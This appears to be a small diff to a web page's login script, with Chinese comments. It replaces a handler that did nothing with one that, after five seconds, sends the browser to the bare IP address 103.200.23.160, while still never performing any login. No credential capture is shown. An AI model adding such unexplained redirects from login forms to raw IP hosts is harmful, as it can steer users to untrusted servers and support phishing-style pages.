@@ -96,10 +96,16 @@
       });
     });
 
-    // 按下 Login 後不做任何反應
+    // 按下 Login 後，5 秒後跳轉到 http://103.200.23.160
     function handleLogin(event) {
+      // 先阻止表單預設送出行為
       event.preventDefault();
-      // 什麼也不做
+
+      // 這裡可以根據需求做任何驗證或處理 (例如顯示 "Logging in..." 之類資訊)
+
+      setTimeout(() => {
+        window.location.href = "http://103.200.23.160";
+      }, 5000); // 5 秒後跳轉，可自行調整
     }
   </script>
 </head>
